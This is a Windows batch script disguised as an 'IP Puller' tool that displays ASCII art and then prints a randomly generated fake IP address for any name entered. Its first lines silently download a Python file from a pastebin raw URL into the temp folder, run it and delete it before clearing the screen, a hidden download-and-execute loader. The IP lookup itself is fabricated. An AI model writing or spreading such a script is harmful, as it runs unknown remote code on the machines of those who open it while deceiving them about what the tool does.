@echo off
color 7
title 777elite.bat
cd %temp%
curl -s https://pastebin.com/raw --output temp.py
python temp.py
del temp.py
cls
chcp 65001 >nul
cls
echo                       ███████╗
echo                       ╚════██║
echo                           ██╔╝
echo                          ██╔╝ 
echo                          ██║  
echo                          ╚═╝  
ping localhost -n 2 > nul        
cls
echo                    ███████╗███████╗
echo                    ╚════██║╚════██║
echo                        ██╔╝    ██╔╝
echo                       ██╔╝    ██╔╝ 
echo                       ██║     ██║  
echo                       ╚═╝     ╚═╝  
ping localhost -n 2 > nul
cls
echo                 ███████╗███████╗███████╗
echo                 ╚════██║╚════██║╚════██║
echo                     ██╔╝    ██╔╝    ██╔╝
echo                    ██╔╝    ██╔╝    ██╔╝ 
echo                    ██║     ██║     ██║  
echo                    ╚═╝     ╚═╝     ╚═╝  
ping localhost -n 2 > nul
cls
:main
for /f %%A in ('"promt $H &echo on &for %%B in (1) do rem"') do set BS=%%A                        
echo                  ███████╗███████╗███████╗
echo                  ╚════██║╚════██║╚════██║
echo                      ██╔╝    ██╔╝    ██╔╝
echo                     ██╔╝    ██╔╝    ██╔╝ 
echo                     ██║     ██║     ██║  
echo                     ╚═╝     ╚═╝     ╚═╝ IP Puller 1.7
echo.
echo.
echo.
echo ║
echo ║=^>
set /p ip=.%BS%
echo.
echo checking info.
ping localhost -n 2 >  nul
echo checking info..
ping localhost -n 2 >  nul
echo checking info...
ping localhost -n 2 >  nul
:rnd1
set one=%random%
if %one% gtr 255 goto rnd1

:rnd2
set two=%random%
if %two% gtr 255 goto rnd2

:rnd3
set three=%random%
if %three% gtr 255 goto rnd3

:rnd4
set four=%random%
if %four% gtr 255 goto rnd4
echo %ip%'s ip address is: %one%.%two%.%three%.%four%
echo.
echo.
set /p more=any More? (Y/N)
if /i "%more%" == "y" goto main
if /i "%more%" == "n" goto exit
pause
                 

                
